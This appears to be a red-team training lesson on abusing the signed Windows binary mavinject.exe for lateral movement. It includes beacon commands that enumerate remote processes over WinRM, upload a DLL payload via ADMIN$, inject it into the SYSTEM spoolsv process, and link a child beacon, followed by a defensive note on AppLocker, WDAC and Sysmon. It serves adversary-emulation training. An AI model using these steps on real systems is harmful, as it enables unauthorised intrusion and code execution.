# LOLBAS

Using a [LOLBAS](https://lolbas-project.github.io/) (Living Off The Land Binaries and Scripts) to facilitate lateral movement is popular amongst some threat actors.  These are binaries, scripts, or libraries that are native to Windows or can be downloaded from Microsoft; are signed with Microsoft's official code-signing certificate; and have functionality useful to a threat, such as arbitrary code execution.

### MavInject <a href="#el_1746355259367_385" id="el_1746355259367_385"></a>

MavInject is a signed Microsoft executable that provides functionality for App-V to inject libraries into other process.  It lives in the System32/SysWOW64 directories on default Windows installations.



<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/7967daf5279c010c8a881aba2daea1a8.png" alt=""><figcaption></figcaption></figure>

This utility can be abused to inject any arbitrary DLL into a target process, using the syntax `mavinject.exe [PID] /INJECTRUNNING [DLL PATH]`.  First, use `remote-exec` to list the running processes on the remote target.

```batch
beacon> remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id

Id             : 1992
ProcessName    : spoolsv
UserName       : NT AUTHORITY\SYSTEM

Id             : 2280
ProcessName    : CompatTelRunner
UserName       : NT AUTHORITY\SYSTEM

Id             : 2588
ProcessName    : AggregatorHost
UserName       : NT AUTHORITY\SYSTEM

[...snip...]
```

Then, upload a DLL payload to the target and use MavInject to inject it into your chosen process.

```batch
beacon> cd \\lon-ws-1\ADMIN$\System32
beacon> upload C:\Payloads\smb_x64.dll

beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
Started process 1608 on lon-ws-1

beacon> link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
[+] established link to child beacon: 10.10.120.10
```

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/1cff67eaa35f7d335e94735bc6d7c860.png" alt="" width="100%"><figcaption></figcaption></figure>

### OPSEC <a href="#el_1746438402174_368" id="el_1746438402174_368"></a>

<mark style="color:red;">**Most mature organisations have a good handle on LOLBAS abuses.  They can be blocked outright using application control technologies such as AppLocker and WDAC, or their use simply logged via process creation events generated by Sysmon or other monitoring tools.  For those reasons, the use of LOLBAS is generally more application to adversary emulation rather than simulation.**</mark>
